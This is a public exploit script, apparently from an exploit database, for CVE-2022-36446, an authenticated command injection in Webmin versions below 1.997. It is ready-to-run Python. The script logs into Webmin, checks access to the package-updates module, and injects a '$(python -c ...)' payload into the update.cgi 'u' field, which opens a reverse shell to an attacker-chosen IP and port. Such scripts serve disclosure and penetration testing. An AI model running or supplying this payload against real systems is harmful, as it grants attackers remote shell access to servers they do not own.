# Exploit Title: Webmin 1.996 - Remote Code Execution (RCE) (Authenticated)
# Date: 2022-07-25
# Exploit Author: Emir Polat
# Technical analysis: https://medium.com/@emirpolat/cve-2022-36446-webmin-1-997-7a9225af3165
# Vendor Homepage: https://www.webmin.com/
# Software Link: https://www.webmin.com/download.html
# Version: < 1.997
# Tested On: Version 1.996 - Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)
# CVE: CVE-2022-36446

import argparse
import requests
from bs4 import BeautifulSoup

def login(args):
    global session
    global sysUser

    session = requests.Session()
    loginUrl = f"{args.target}:10000/session_login.cgi"
    infoUrl = f"{args.target}:10000/sysinfo.cgi"

    username = args.username
    password = args.password
    data = {'user': username, 'pass': password}

    login = session.post(loginUrl, verify=False, data=data, cookies={'testing': '1'})
    sysInfo = session.post(infoUrl, verify=False, cookies={'sid' : session.cookies['sid']})

    bs = BeautifulSoup(sysInfo.text, 'html.parser')
    sysUser = [item["data-user"] for item in bs.find_all() if "data-user" in item.attrs]

    if sysUser:
        return True
    else:
        return False

def exploit(args):
    payload = f"""
    1337;$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{args.listenip}",{args.listenport}));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")');
    """

    updateUrl = f"{args.target}:10000/package-updates"
    exploitUrl = f"{args.target}:10000/package-updates/update.cgi"

    exploitData = {'mode' : 'new', 'search' : 'ssh', 'redir' : '', 'redirdesc' : '', 'u' : payload, 'confirm' : 'Install+Now'}

    if login(args):
        print("[+] Successfully Logged In !")
        print(f"[+] Session Cookie => sid={session.cookies['sid']}")
        print(f"[+] User Found  => {sysUser[0]}")

        res = session.get(updateUrl)
        bs = BeautifulSoup(res.text, 'html.parser')

        updateAccess = [item["data-module"] for item in bs.find_all() if "data-module" in item.attrs]

        if updateAccess[0] == "package-updates":
            print(f"[+] User '{sysUser[0]}' has permission to access <<Software Package Updates>>")
            print(f"[+] Exploit starting ... ")
            print(f"[+] Shell will spawn to {args.listenip} via port {args.listenport}")

            session.headers.update({'Referer'  : f'{args.target}:10000/package-updates/update.cgi?xnavigation=1'})
            session.post(exploitUrl, data=exploitData)
        else:
            print(f"[-] User '{sysUser[0]}' unfortunately hasn't permission to access <<Software Package Updates>>")
    else:
        print("[-] Login Failed !")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Webmin < 1.997 - Remote Code Execution (Authenticated)")
    parser.add_argument('-t', '--target', help='Target URL, Ex: https://webmin.localhost', required=True)
    parser.add_argument('-u', '--username', help='Username For Login', required=True)
    parser.add_argument('-p', '--password', help='Password For Login', required=True)
    parser.add_argument('-l', '--listenip', help='Listening address required to receive reverse shell', required=True)
    parser.add_argument('-lp','--listenport', help='Listening port required to receive reverse shell', required=True)
    parser.add_argument("-s", '--ssl', help="Use if server support SSL.", required=False)
    args = parser.parse_args()
    exploit(args)